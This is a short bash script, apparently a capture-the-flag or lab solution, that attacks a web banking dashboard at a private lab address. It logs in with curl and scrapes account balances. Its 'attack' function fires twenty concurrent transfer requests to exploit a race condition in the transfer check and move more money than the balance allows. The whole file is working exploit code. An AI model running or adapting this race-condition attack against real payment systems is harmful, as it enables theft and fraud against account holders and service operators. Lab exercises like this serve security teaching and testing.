#!/usr/bin/env bash

user_1=07799991337
user_2=07113371111
password='pass1234'

url='http://10.10.149.9:8080'
dashboard="$url/dashboard"
login="$url/login"
transfer="$dashboard/transfer"

scan()
{
        curl -L $auth -o 'home'
}

get_balance()
{
	user=$1
	login $user
	balance=$(curl -sL $dashboard --cookie cookie.txt --stderr - | grep -oP '(?<=Current Balance</div><div class="text-white">)\$[0-9]+\.[0-9]+')
	echo "User ($user): $balance"
}

login()
{
        username=$1

        authenticate=$(curl -sL $login --cookie-jar cookie.txt -d "username=$username" -d "password=$password")

}

dashboard()
{
	user=$1
	login $user
	curl -sL $dashboard --cookie cookie.txt -vvvv -O
}

show_balances()
{
	get_balance $user_1
	get_balance $user_2
}

transfer()
{
	from=$1
	to="${2:0:3}+${2:3:4}+${2:7:4}"
	amount=$3


	response=$(curl -sL $transfer --cookie cookie.txt -d "targetPhoneNumber=$to" -d "confirmTargetPhoneNumber=$to" -d "amount=$amount")
	if [[ "$response" == *"declined"* ]]; then
		echo "Transaction declined"
		echo "$response"
	fi

}

attack()
{
	login $user_2
	for i in `seq 1 20`; do
		(transfer $user_2 $user_1 20) &
	done
}


# You need to play around with this part
#transfer $user_2 $user_1 10
#attack
#dashboard $user_1

echo "Updated Balances: "
#show_balances

